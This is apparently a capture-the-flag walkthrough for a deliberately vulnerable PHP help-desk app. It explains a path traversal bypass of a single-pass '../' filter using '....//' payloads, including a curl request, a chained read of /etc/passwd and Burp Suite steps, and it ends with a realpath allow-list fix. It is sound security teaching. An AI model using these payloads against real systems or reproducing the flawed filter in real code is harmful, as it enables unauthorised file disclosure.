# Deskmint — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability (level 3 — non-recursive filter)

`src/Attachment.php` "sanitises" the requested filename like this:

```php
$safe = str_replace('../', '', $requested);   // single, non-recursive pass
return $attachmentsDir . '/' . $safe;
```

The developer assumes that stripping `../` makes the input safe. It does not,
because `str_replace` performs a **single pass** and does not re-scan the
result. A payload where the `../` is *reconstructed after* the replacement
slips straight through:

```
"....//"  --strip "../"-->  "../"
```

The middle `../` inside `....//` is removed, and the leftover characters
(`..` + `/`) collapse into a working `../`. The resolved path then escapes the
attachments directory — a path traversal (CWE-22) behind a naive filter.

## Exploitation

Normal, intended request:

```
GET /attachment.php?file=vpn-client.log
```

A plain `../` is neutralised (the filter makes it resolve *inside* the
attachments dir, so you get a 404):

```
GET /attachment.php?file=../flag.txt      -> 404 (filter won)
```

The bypass — double it up so a `../` survives the single pass:

```
GET /attachment.php?file=....//flag.txt   -> the flag
```

With `curl`:

```bash
curl --path-as-is "http://localhost:8099/attachment.php?file=....//flag.txt"
```

Expected output:

```
FLAG{DESKMINT_ROOT_TICKET}
```

### Going further

Chain the payload to climb further and read files outside the app:

```
GET /attachment.php?file=....//....//....//....//etc/passwd
```

## Doing it in Burp Suite

1. Proxy your browser through Burp and open <http://localhost:8099>.
2. Open a ticket and capture the **Download** request in **Proxy > HTTP history**.
3. Send it to **Repeater**.
4. First try `file=../flag.txt` — note it is blocked (404). This confirms a
   filter is present.
5. Change it to `file=....//flag.txt` and send — the filter is bypassed and the
   flag comes back.

## The fix

Stripping substrings is the wrong approach — it is a blocklist, and blocklists
for path traversal are notoriously bypassable (`....//`, encodings, absolute
paths, ...). Resolve the real path and verify it stays inside the base dir:

```php
$base = realpath($attachmentsDir);
$full = realpath($attachmentsDir . '/' . $requested);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

Better still: never accept raw filenames. Map an opaque id to a known file
server-side (an allow-list), so user input never touches the filesystem path.
